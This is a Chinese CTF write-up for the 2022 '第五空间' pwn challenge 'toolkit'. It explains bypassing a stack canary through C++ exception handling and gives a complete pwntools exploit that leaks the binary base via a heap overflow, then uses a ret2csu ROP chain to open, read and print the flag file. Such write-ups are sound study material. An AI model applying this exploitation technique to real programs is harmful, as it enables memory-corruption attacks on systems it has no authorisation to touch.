# toolkit

> Category: PWN 
>
> Date: 2022/09/20
>
> Authorship: 5Space 2022

## 0x00 C++异常处理绕过canary

[Shanghai-DCTF-2017 线下攻防Pwn题 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/89855】#h2-11)

简单来说就是覆盖rbp和返回地址，甚至通过大量溢出覆盖上个函数的返回地址，之后触发C++异常处理，输入错误的内容让程序进入catch处理

需要注意的是，rbp需要控制成存在异常处理函数的调用者函数（caller）

## 0x01 例题 第五空间2022 toolkit

堆溢出泄露elf地址

栈溢出利用异常处理绕过cannary然后csu rop去orw打印flag

````python
# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64')
context.log_level = 'debug'

elf = ELF("./toolkit")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
local = 1

if local:
    p = process("./toolkit")    
else:
    # libc = ELF('libc.so.6')
    p = remote("","")

def debug(p,cmd=""):
    if local:
        gdb.attach(p,cmd)
    else:
        pass

def choice(cmd):
    p.recvuntil("[+]")
    p.sendline(str(cmd))


def gift(passwd):
    choice(0xDEAD00)
    p.sendlineafter(b"Password:",passwd)


def tools2_func2(size,data,key):
    choice(2)
    p.sendlineafter(b"[-]","2")
    p.sendlineafter(b"Length: ",str(size))
    p.sendlineafter(b"Content: ",data)
    p.sendlineafter(b"Key:",key)

def csu(elf_base,call,rdi,rsi,rdx):
    csu_front=elf_base+0x2910
    csu_end=elf_base+0x292a
    payload = p64(csu_end)+p64(0)+p64(1)+p64(rdi)+p64(rsi)+p64(rdx)+p64(call)+p64(csu_front)
    payload += b'\x00'*0x38
    return payload



gift(b'a'*0x210)
p.recvuntil(b'a'*0x210)
elf_base = u64(p.recv(6).ljust(8,b'\x00'))-0x150a
print("[elf_base] ==>",hex(elf_base))
leave_ret = elf_base+0x1512
rbp = elf_base+0x5060
ret = elf_base+0x25db
print("[leave_ret] ==>",hex(leave_ret))
print("[rbp] ==>",hex(rbp))
print("[ret] ==>",hex(ret))

print("[open] ==>",hex(elf_base+elf.plt['open']))
pop_rdi = elf_base+0x0000000000002933
pop_rbp = elf_base+0x0000000000001473
pop_rsi_r15 = elf_base+0x0000000000002931


rop_gadget = p64(pop_rdi)
rop_gadget += p64(rbp)
rop_gadget += p64(pop_rsi_r15)
rop_gadget += p64(0)*2
rop_gadget += p64(elf_base+0x1270) # open
rop_gadget += csu(elf_base,elf_base+0x4f60,3,rbp+0x100,0x30) # read
rop_gadget += p64(pop_rdi)
rop_gadget += p64(rbp+0x100)
rop_gadget += p64(elf_base+elf.plt['puts'])
rop_gadget += p64(0xdeadbeaf)

debug(p,"b * "+hex(elf_base+elf.plt['open']))
tools2_func2(-1,b"./flag".ljust(8,b'\x00')+p64(0x30)+p64(rbp)*(int(0x138/8)-2)+p64(ret)+p64(0xdeadbaef)*5+rop_gadget,"1"*17)

# debug(p)

p.interactive()
````

## 0x02 碎碎念

还有一个奇怪的点是，ubuntu22中pwntools直接用elf.plt拿函数地址偏移总是有问题，这里我全是用gdb看got表手算偏移来orw的~

